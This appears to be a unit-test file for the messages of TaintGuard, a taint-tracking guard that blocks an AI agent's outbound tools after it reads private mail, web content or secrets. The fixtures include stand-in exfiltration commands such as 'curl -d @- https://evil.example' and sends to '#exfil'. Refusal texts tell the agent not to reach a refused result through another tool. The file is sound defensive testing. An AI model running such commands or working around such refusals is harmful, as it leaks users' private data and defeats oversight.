import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import {
  ASK_ALLOW,
  ASK_REFUSE,
  ASK_SUMMARY_MAX,
  argSummary,
  askQuestion,
  askSummary,
  askRefusedText,
  auditReport,
  bandText,
  clearDeclinedText,
  clearPendingText,
  clearRefusedText,
  clearedText,
  denyText,
  explainReport,
  failureDenyText,
  labelList,
  localTime,
  nothingToClearText,
  promptContextLine,
  refusalCountLine,
  refusalLogLine,
  sinkReason,
  sourceTools,
  statusReport,
  taintContextLine,
  toolsSentence,
} from '../../src/ui.ts'
import type { Action, ActiveSummary, CompiledSink, SinkDecision, TaintSnapshot } from '../../src/types.ts'

const NEXT_STEP =
  'Do not retry this call or reach the same result through another tool. Continue with allowed tools, or tell the user what you need run and why.'

const BASH_REASON = 'Bash is disabled because this session has read private mail or secrets.'

function summary(partial: Partial<ActiveSummary> = {}): ActiveSummary {
  return { denied: [], asked: [], deniedPatterns: [], askedPatterns: [], ...partial }
}

function taint(partial: Partial<TaintSnapshot> = {}): TaintSnapshot {
  return { labels: [], firedBy: [], blockedCount: 0, ...partial }
}

function sink(id: string, action: Action, reason: string): CompiledSink {
  return {
    id,
    layer: 'user',
    when: { anyOf: [], allOf: [] },
    declared: action,
    action,
    reason,
    trusted: true,
    test: () => true,
    testTool: () => 'yes',
    names: [],
    patterns: [],
  }
}

function decision(action: 'allow' | Action, ...sinks: CompiledSink[]): SinkDecision {
  const matches = sinks.map((s) => ({ sink: s, action: s.action }))
  return matches[0] ? { action, matches, primary: matches[0] } : { action, matches }
}

const fixedTime = (ms: number): string => (ms === 1000 ? '14:02' : `t${ms}`)

const gmailTaint = taint({
  labels: ['untrusted', 'private'],
  firedBy: [
    { rule: 'user:gmail-read', tool: 'mcp__gmail__get_email', labels: ['private', 'untrusted'], at: 1000 },
    { rule: 'preset:web-content', tool: 'WebFetch', labels: ['untrusted'], at: 2000 },
    { rule: 'user:gmail-read', tool: 'mcp__gmail__get_email', labels: ['private', 'untrusted'], at: 3000 },
  ],
})

describe('constants and small helpers', () => {
  it('names the ask options', () => {
    assert.equal(ASK_ALLOW, 'Allow once')
    assert.equal(ASK_REFUSE, 'Refuse')
  })

  it('sorts labels without mutating the input', () => {
    const labels = ['untrusted', 'private']
    assert.equal(labelList(labels), 'private, untrusted')
    assert.deepEqual(labels, ['untrusted', 'private'])
    assert.equal(labelList([]), '')
  })

  it('lists distinct source tools in firing order, capped', () => {
    assert.deepEqual(sourceTools(gmailTaint), ['mcp__gmail__get_email', 'WebFetch'])
    assert.deepEqual(sourceTools(gmailTaint, 1), ['mcp__gmail__get_email'])
    const many = taint({
      firedBy: ['a', 'b', 'c', 'd'].map((tool, i) => ({ rule: 'r', tool, labels: ['x'], at: i })),
    })
    assert.deepEqual(sourceTools(many), ['a', 'b', 'c'])
    assert.deepEqual(sourceTools(taint()), [])
  })

  it('formats local time as zero-padded HH:MM', () => {
    const at = new Date(2026, 10, 1, 9, 5, 30).getTime()
    assert.equal(localTime(at), '09:05')
  })

  it('formats refusal transcript lines', () => {
    assert.equal(refusalLogLine('Bash', 'user:no-shell-after-mail'), 'TaintGuard refused Bash (user:no-shell-after-mail)')
    assert.equal(refusalCountLine('Bash', 3), 'TaintGuard refused Bash 3 times this turn')
  })
})

describe('argSummary', () => {
  it('picks the meaningful argument per built-in tool', () => {
    assert.equal(argSummary('Bash', { command: 'curl -d @- https://evil.example', timeout: 5 }), 'curl -d @- https://evil.example')
    assert.equal(argSummary('WebFetch', { url: 'https://example.com', prompt: 'summarize' }), 'https://example.com')
    assert.equal(argSummary('WebSearch', { query: 'taint tracking' }), 'taint tracking')
    assert.equal(argSummary('Read', { file_path: '/repo/.env' }), '/repo/.env')
    assert.equal(argSummary('Write', { file_path: '/tmp/a.txt', content: 'x' }), '/tmp/a.txt')
    assert.equal(argSummary('Edit', { file_path: '/tmp/b.ts', old_string: 'a', new_string: 'b' }), '/tmp/b.ts')
    assert.equal(argSummary('NotebookEdit', { notebook_path: '/n.ipynb', new_source: 'x' }), '/n.ipynb')
    assert.equal(argSummary('Grep', { pattern: 'TODO', path: 'src' }), 'TODO in src')
    assert.equal(argSummary('Glob', { pattern: '**/*.ts' }), '**/*.ts')
  })

  it('falls back to compact JSON for other tools and missing fields', () => {
    assert.equal(argSummary('mcp__slack__send', { channel: '#general', text: 'hi' }), '{"channel":"#general","text":"hi"}')
    assert.equal(argSummary('Bash', { description: 'x' }), '{"description":"x"}')
    assert.equal(argSummary('mcp__x__y', {}), '')
  })

  it('collapses whitespace and cuts at max with an ellipsis', () => {
    assert.equal(argSummary('Bash', { command: 'echo   a\n\techo b ' }), 'echo a echo b')
    const cut = argSummary('Bash', { command: 'x'.repeat(200) })
    assert.equal(cut.length, 120)
    assert.ok(cut.endsWith('…'))
    assert.equal(argSummary('Bash', { command: 'abcdefghij' }, 5), 'abcd…')
    assert.equal(argSummary('Bash', { command: 'abcde' }, 5), 'abcde')
  })

  it('survives arguments JSON cannot print', () => {
    const cyclic: Record<string, unknown> = {}
    cyclic.self = cyclic
    assert.equal(argSummary('mcp__x__y', cyclic), '[unprintable arguments]')
  })
})

describe('deny texts', () => {
  const base = {
    tool: 'Bash',
    reason: BASH_REASON,
    labels: ['untrusted', 'private'],
    fromTools: ['mcp__gmail__get_email'],
    rule: 'user:no-shell-after-mail',
  }

  it('matches the spec deny text exactly', () => {
    assert.equal(
      denyText(base),
      [
        'TaintGuard refused Bash. Bash is disabled because this session has read private mail or secrets.',
        'Active labels: private, untrusted (from mcp__gmail__get_email). Rule: user:no-shell-after-mail.',
        NEXT_STEP,
      ].join('\n'),
    )
    assert.equal(denyText(base).split('\n').length, 3)
  })

  it('omits the from part with no source tools and joins several', () => {
    assert.equal(denyText({ ...base, fromTools: [] }).split('\n')[1], 'Active labels: private, untrusted. Rule: user:no-shell-after-mail.')
    assert.equal(
      denyText({ ...base, fromTools: ['mcp__gmail__get_email', 'WebFetch'] }).split('\n')[1],
      'Active labels: private, untrusted (from mcp__gmail__get_email, WebFetch). Rule: user:no-shell-after-mail.',
    )
  })

  it('describes lockdown instead of labels', () => {
    assert.equal(
      denyText({ ...base, labels: [], fromTools: [], lockdown: 'user policy is invalid' }).split('\n')[1],
      'Active labels: all (TaintGuard is in lockdown: user policy is invalid). Rule: user:no-shell-after-mail.',
    )
    assert.equal(denyText({ ...base, lockdown: null }), denyText(base))
  })

  it('handles an empty reason without a trailing space', () => {
    assert.equal(denyText({ ...base, reason: '' }).split('\n')[0], 'TaintGuard refused Bash.')
  })

  it('words a refused ask', () => {
    const lines = askRefusedText(base).split('\n')
    assert.equal(lines.length, 3)
    assert.equal(lines[0], `TaintGuard refused Bash: the user did not approve it. ${BASH_REASON}`)
    assert.equal(lines[1], 'Active labels: private, untrusted (from mcp__gmail__get_email). Rule: user:no-shell-after-mail.')
    assert.equal(lines[2], NEXT_STEP)
  })

  it('words a guard failure', () => {
    assert.equal(
      failureDenyText('Bash', 'guard timed out'),
      [
        'TaintGuard refused Bash. TaintGuard could not finish checking this call (guard timed out) and it may match a rule that blocks it.',
        NEXT_STEP,
      ].join('\n'),
    )
  })
})

describe('askQuestion', () => {
  it('asks with the argument summary and ends with a question mark', () => {
    const question = askQuestion({
      tool: 'WebFetch',
      argSummary: 'https://example.com',
      reason: 'This would send data out of a session that holds private, third-party content.',
      labels: ['untrusted', 'private'],
    })
    assert.equal(
      question,
      'This would send data out of a session that holds private, third-party content. This session holds private, untrusted content. Allow WebFetch (https://example.com) once?',
    )
    assert.ok(question.endsWith('?'))
  })

  it('omits the parenthesis with no argument summary', () => {
    assert.equal(
      askQuestion({ tool: 'mcp__x__send', argSummary: '', reason: 'Outbound.', labels: ['private'] }),
      'Outbound. This session holds private content. Allow mcp__x__send once?',
    )
  })
})

describe('context lines', () => {
  const active = summary({
    denied: ['Bash'],
    asked: ['WebFetch', 'mcp__slack__slack_send_message'],
    askedPatterns: ['/^mcp__.+__send/i'],
  })

  it('renders tool sentences with patterns last', () => {
    assert.deepEqual(toolsSentence(active), {
      refused: 'Bash',
      asks: 'WebFetch, mcp__slack__slack_send_message, tools matching /^mcp__.+__send/i',
    })
    assert.deepEqual(toolsSentence(summary()), { refused: '', asks: '' })
  })

  it('matches the spec same-turn line', () => {
    assert.equal(
      taintContextLine({
        labels: ['untrusted', 'private'],
        fromTools: ['mcp__gmail__read_message'],
        summary: summary({ denied: ['Bash'], asked: ['WebFetch', 'mcp__slack__slack_send_message'] }),
      }),
      'TaintGuard: this session now holds private, untrusted content (from mcp__gmail__read_message). From now on these tools will be refused: Bash. These need user approval: WebFetch, mcp__slack__slack_send_message.',
    )
  })

  it('drops empty clauses in the same-turn line', () => {
    assert.equal(
      taintContextLine({ labels: ['untrusted'], fromTools: ['WebFetch'], summary: summary({ asked: ['Bash'] }) }),
      'TaintGuard: this session now holds untrusted content (from WebFetch). These need user approval: Bash.',
    )
    assert.equal(
      taintContextLine({ labels: ['secret'], fromTools: [], summary: summary({ denied: ['Bash'] }) }),
      'TaintGuard: this session now holds secret content. From now on these tools will be refused: Bash.',
    )
    assert.equal(
      taintContextLine({ labels: ['untrusted'], fromTools: ['WebFetch'], summary: summary() }),
      'TaintGuard: this session now holds untrusted content (from WebFetch). No tool is blocked by this yet.',
    )
  })

  it('renders the next-turn line', () => {
    assert.equal(
      promptContextLine({
        labels: ['private', 'untrusted'],
        fromTools: ['mcp__gmail__get_email'],
        summary: summary({ denied: ['Bash'], asked: ['WebFetch'] }),
        lockdown: null,
      }),
      'TaintGuard: this session holds private, untrusted content (from mcp__gmail__get_email). These tools are refused: Bash. These need user approval: WebFetch. Do not try to reach a refused result through another tool.',
    )
    assert.equal(
      promptContextLine({ labels: ['untrusted'], fromTools: [], summary: summary(), lockdown: null }),
      'TaintGuard: this session holds untrusted content. No tool is blocked by this yet.',
    )
  })

  it('renders the next-turn line in lockdown', () => {
    assert.equal(
      promptContextLine({
        labels: [],
        fromTools: [],
        summary: summary({ denied: ['Bash', 'WebFetch'], deniedPatterns: ['/^mcp__.+__send/i'] }),
        lockdown: 'managed policy could not be read',
      }),
      'TaintGuard is in lockdown (managed policy could not be read): every rule is active as if all labels were present. These tools are refused: Bash, WebFetch, tools matching /^mcp__.+__send/i. Do not try to reach a refused result through another tool.',
    )
  })
})

describe('bandText', () => {
  it('draws nothing while clean', () => {
    assert.equal(bandText({ taint: taint(), lockdown: null, summary: summary({ denied: ['Bash'] }) }), null)
  })

  it('matches the spec band example', () => {
    const band = bandText({
      taint: gmailTaint,
      lockdown: null,
      summary: summary({
        denied: ['Bash'],
        asked: [
          'WebFetch',
          'mcp__drive__upload_file',
          'mcp__gmail__send_email',
          'mcp__slack__slack_post_message',
          'mcp__slack__slack_send_message',
        ],
        askedPatterns: ['/^mcp__.+__send/i'],
      }),
      formatTime: fixedTime,
    })
    assert.equal(
      band,
      'TaintGuard · tainted: private, untrusted (mcp__gmail__get_email, 14:02) · blocked: Bash · asks: WebFetch, 4 MCP tools · /taintguard',
    )
  })

  it('counts a single MCP tool and omits empty segments', () => {
    assert.equal(
      bandText({ taint: gmailTaint, lockdown: null, summary: summary({ asked: ['mcp__slack__send'] }), formatTime: fixedTime }),
      'TaintGuard · tainted: private, untrusted (mcp__gmail__get_email, 14:02) · asks: 1 MCP tool · /taintguard',
    )
    assert.equal(
      bandText({ taint: gmailTaint, lockdown: null, summary: summary(), formatTime: fixedTime }),
      'TaintGuard · tainted: private, untrusted (mcp__gmail__get_email, 14:02) · /taintguard',
    )
  })

  it('falls back to "rules on other tools" only when a list would be empty', () => {
    assert.equal(
      bandText({
        taint: gmailTaint,
        lockdown: null,
        summary: summary({ denied: ['Bash'], deniedPatterns: ['/x/'], askedPatterns: ['/^mcp__.+__send/i'] }),
        formatTime: fixedTime,
      }),
      'TaintGuard · tainted: private, untrusted (mcp__gmail__get_email, 14:02) · blocked: Bash · asks: rules on other tools · /taintguard',
    )
  })

  it('omits the origin when no firing is recorded', () => {
    assert.equal(
      bandText({ taint: taint({ labels: ['secret'] }), lockdown: null, summary: summary({ denied: ['Bash'] }) }),
      'TaintGuard · tainted: secret · blocked: Bash · /taintguard',
    )
  })

  it('uses local HH:MM by default', () => {
    const at = new Date(2026, 10, 1, 7, 4).getTime()
    const band = bandText({
      taint: taint({ labels: ['untrusted'], firedBy: [{ rule: 'r', tool: 'WebFetch', labels: ['untrusted'], at }] }),
      lockdown: null,
      summary: summary(),
    })
    assert.equal(band, 'TaintGuard · tainted: untrusted (WebFetch, 07:04) · /taintguard')
  })

  it('shows lockdown even when clean', () => {
    assert.equal(
      bandText({ taint: taint(), lockdown: 'user policy: labels is required', summary: summary() }),
      'TaintGuard · LOCKDOWN: user policy: labels is required · all sinks active',
    )
    assert.equal(
      bandText({ taint: gmailTaint, lockdown: 'bad', summary: summary({ denied: ['Bash'] }) }),
      'TaintGuard · LOCKDOWN: bad · all sinks active',
    )
  })
})

describe('statusReport', () => {
  const baseInput = {
    taint: taint(),
    lockdown: null,
    enabled: true,
    preset: 'trifecta',
    layers: [
      { layer: 'preset', path: null, status: 'loaded', rules: 6 },
      { layer: 'user', path: '~/.claude/taint-guard.json', status: 'loaded', rules: 1 },
      { layer: 'project', path: '.claude/taint-guard.json', status: 'dropped', rules: 0, error: 'version must be 1' },
    ],
    warnings: [],
    activeSinks: [],
    summary: summary(),
    background: [],
    formatTime: fixedTime,
  }

  it('reports a clean session', () => {
    const report = statusReport(baseInput)
    assert.equal(report.split('\n')[0], 'TaintGuard: clean')
    assert.equal(
      report,
      [
        'TaintGuard: clean',
        '',
        'Labels',
        '  none',
        '',
        'Active rules',
        '  none',
        '',
        'Refused calls: 0',
        '',
        'Refused now: none',
        'Needs approval: none',
        '',
        'Policy layers (preset: trifecta)',
        '  preset: loaded, 6 rules, no file',
        '  user: loaded, 1 rule, ~/.claude/taint-guard.json',
        '  project: dropped, 0 rules, .claude/taint-guard.json, error: version must be 1',
        '',
        'Warnings',
        '  none',
        '',
        'Background tasks started before taint',
        '  none',
      ].join('\n'),
    )
  })

  it('reports a tainted session with its origins, rules and background tasks', () => {
    const report = statusReport({
      ...baseInput,
      taint: {
        ...gmailTaint,
        firedBy: [...gmailTaint.firedBy.slice(0, 2), { rule: 'store', tool: 'Read', labels: ['secret'], at: 1000, agentId: 'a1' }],
        labels: ['untrusted', 'private', 'secret', 'lost'],
        blockedCount: 2,
      },
      activeSinks: [{ id: 'user:no-shell-after-mail', action: 'deny', reason: BASH_REASON }],
      summary: summary({ denied: ['Bash'], asked: ['WebFetch'], askedPatterns: ['/^mcp__.+__send/i'] }),
      warnings: ['managedPolicyPath in user settings is ignored'],
      background: [{ id: 'b1', type: 'shell', description: 'dev server', command: 'npm run dev' }],
    })
    const lines = report.split('\n')
    assert.equal(lines[0], 'TaintGuard: tainted (lost, private, secret, untrusted)')
    assert.ok(lines.includes('  lost: no record of the call that added it'))
    assert.ok(lines.includes('  private: user:gmail-read via mcp__gmail__get_email at 14:02'))
    assert.ok(lines.includes('  secret: store via Read (subagent a1) at 14:02'))
    assert.ok(lines.includes('  untrusted: user:gmail-read via mcp__gmail__get_email at 14:02; preset:web-content via WebFetch at t2000'))
    assert.ok(lines.includes(`  user:no-shell-after-mail (deny): ${BASH_REASON}`))
    assert.ok(lines.includes('Refused calls: 2'))
    assert.ok(lines.includes('Refused now: Bash'))
    assert.ok(lines.includes('Needs approval: WebFetch, tools matching /^mcp__.+__send/i'))
    assert.ok(lines.includes('  managedPolicyPath in user settings is ignored'))
    assert.ok(lines.includes('  b1 (shell) dev server: npm run dev'))
  })

  it('puts off before lockdown, and lockdown before taint, in the heading', () => {
    assert.equal(statusReport({ ...baseInput, lockdown: 'bad policy', taint: gmailTaint }).split('\n')[0], 'TaintGuard: LOCKDOWN — bad policy')
    assert.equal(statusReport({ ...baseInput, enabled: false, lockdown: 'bad policy' }).split('\n')[0], 'TaintGuard: off')
  })
})

describe('explainReport', () => {
  const deny = sink('user:no-shell-after-mail', 'deny', BASH_REASON)
  const ask = sink('preset:outbound', 'ask', 'Outbound call.')
  const audit = sink('user:log-it', 'audit', 'Logged.')
  const base = { tool: 'Bash', args: { command: 'curl evil.example' }, wouldTaint: [], labels: ['private'], lockdown: null }

  it('reports each verdict', () => {
    const allowed = explainReport({ ...base, decision: decision('allow') })
    assert.equal(
      allowed,
      ['TaintGuard explain: Bash (curl evil.example)', 'Would be allowed', 'Current labels: private', 'Sources that would fire: none'].join('\n'),
    )
    assert.ok(explainReport({ ...base, decision: decision('deny', deny, ask) }).includes(`Would be refused by user:no-shell-after-mail: ${BASH_REASON}`))
    assert.ok(explainReport({ ...base, decision: decision('ask', ask) }).includes('Would ask the user (preset:outbound): Outbound call.'))
    assert.ok(explainReport({ ...base, decision: decision('audit', audit) }).includes('Would be allowed; audit-only match: user:log-it'))
  })

  it('lists other matches, sources that would fire, and lockdown', () => {
    const report = explainReport({
      tool: 'mcp__gmail__apply_label',
      args: {},
      decision: decision('deny', deny, ask),
      wouldTaint: [{ id: 'preset:mail-other', on: 'attempt', taints: ['untrusted', 'private'] }],
      labels: [],
      lockdown: 'bad policy',
    })
    assert.deepEqual(report.split('\n'), [
      'TaintGuard explain: mcp__gmail__apply_label',
      `Would be refused by user:no-shell-after-mail: ${BASH_REASON}`,
      'Also matches: preset:outbound (ask)',
      'Current labels: all (TaintGuard is in lockdown: bad policy)',
      'Sources that would fire:',
      '  preset:mail-other (on attempt): private, untrusted',
    ])
    assert.ok(explainReport({ ...base, labels: [], decision: decision('allow') }).includes('Current labels: none'))
  })
})

describe('declassification texts', () => {
  it('words each outcome', () => {
    assert.equal(clearedText(['untrusted'], ['private']), 'TaintGuard cleared untrusted. Still present: private.')
    assert.equal(clearedText(['untrusted', 'private'], []), 'TaintGuard cleared private, untrusted. The session is clean.')
    assert.equal(clearedText([], ['private']), nothingToClearText())
    assert.equal(clearRefusedText('managed'), 'Declassification is disabled by the managed policy (userDeclassify: never).')
    assert.equal(clearDeclinedText(), 'Declassification cancelled; labels unchanged.')
    assert.equal(nothingToClearText(), 'TaintGuard: nothing to clear; no matching label is present.')
  })

  it('names labels that arrived during the confirmation', () => {
    assert.equal(
      clearedText(['private'], ['secret'], ['secret']),
      'TaintGuard cleared private. Still present: secret. Kept secret, which arrived while you were confirming.',
    )
    assert.equal(clearedText(['private'], [], []), 'TaintGuard cleared private. The session is clean.')
  })

  it('says a clear waits for the rebuild', () => {
    assert.match(clearPendingText(), /not yet rebuilt the taint set.*labels unchanged/)
  })
})

describe('askSummary', () => {
  it('lists destination keys of MCP arguments first, in their own order', () => {
    assert.equal(
      askSummary('mcp__slack__send_message', { text: 'hello', thread: 't1', channel: '#exfil', to: 'x@evil.example' }),
      '{"channel":"#exfil","to":"x@evil.example","text":"hello","thread":"t1"}',
    )
    assert.equal(askSummary('mcp__gh__create_issue', { body: 'b', owner: 'me', repo: 'r' }), '{"repo":"r","owner":"me","body":"b"}')
  })

  it('shows the picked argument of built-in tools in full up to 600 characters', () => {
    const command = `curl ${'a'.repeat(560)} https://evil.example`
    assert.equal(askSummary('Bash', { command, description: 'x' }), command)
    assert.equal(askSummary('Bash', { description: 'x', command: 'ls' }), 'ls')
    assert.equal(askSummary('WebFetch', { prompt: 'p', url: 'https://example.com' }), 'https://example.com')
    assert.equal(askSummary('Bash', { description: 'only' }), '{"description":"only"}')
  })

  it('keeps the first 300 and last 280 characters of a longer summary', () => {
    const head = 'h'.repeat(300)
    const tail = 't'.repeat(280)
    const text = askSummary('Bash', { command: `${head}${'m'.repeat(500)}${tail}` })
    assert.equal(text, `${head} … ${tail}`)
    assert.ok(text.length < ASK_SUMMARY_MAX)
    const exact = 'z'.repeat(ASK_SUMMARY_MAX)
    assert.equal(askSummary('Bash', { command: exact }), exact)
  })

  it('collapses whitespace and survives arguments JSON cannot print', () => {
    assert.equal(askSummary('Bash', { command: 'echo  a\n b' }), 'echo a b')
    const cyclic: Record<string, unknown> = {}
    cyclic.self = cyclic
    assert.equal(askSummary('mcp__x__send', cyclic), '[unprintable arguments]')
  })
})

describe('sinkReason', () => {
  it('marks a repository reason and leaves trusted ones alone', () => {
    assert.equal(sinkReason('Bash is off.', false), '(repository policy) Bash is off.')
    assert.equal(sinkReason('Bash is off.', true), 'Bash is off.')
    assert.equal(sinkReason('', false), '')
  })
})

describe('auditReport', () => {
  it('prints the path and one line per entry', () => {
    const report = auditReport('/home/u/.claude/taint-guard/audit/s1.jsonl', [
      { ts: '2026-11-01T14:02:11.204Z', event: 'taint', tool: 'mcp__gmail__get_email', rule: 'user:gmail-read', labels: ['untrusted', 'private'] },
      { ts: '2026-11-01T14:02:15.000Z', event: 'deny', tool: 'Bash', rule: 'user:no-shell-after-mail', labels: ['private'], detail: 'Bash  is\ndisabled' },
      { ts: '2026-11-01T14:03:00.000Z', event: 'lockdown', detail: 'bad policy' },
    ])
    assert.deepEqual(report.split('\n'), [
      'Audit log: /home/u/.claude/taint-guard/audit/s1.jsonl',
      '  2026-11-01T14:02:11.204Z  taint  mcp__gmail__get_email  user:gmail-read  [private, untrusted]',
      '  2026-11-01T14:02:15.000Z  deny  Bash  user:no-shell-after-mail  [private]  Bash is disabled',
      '  2026-11-01T14:03:00.000Z  lockdown  bad policy',
    ])
  })

  it('says when there are no entries', () => {
    assert.equal(auditReport('/a.jsonl', []), 'Audit log: /a.jsonl\n  no entries yet')
  })
})

describe('toolsSentence pattern wording', () => {
  it('keeps described patterns as written and marks raw ones', () => {
    const words = toolsSentence({
      denied: ['Bash'],
      asked: [],
      deniedPatterns: ['MCP tools that send or post', '/^mcp__x__/i', 'mcp__slack…'],
      askedPatterns: [],
    })
    assert.equal(words.refused, 'Bash, MCP tools that send or post, tools matching /^mcp__x__/i, tools matching mcp__slack…')
  })
})
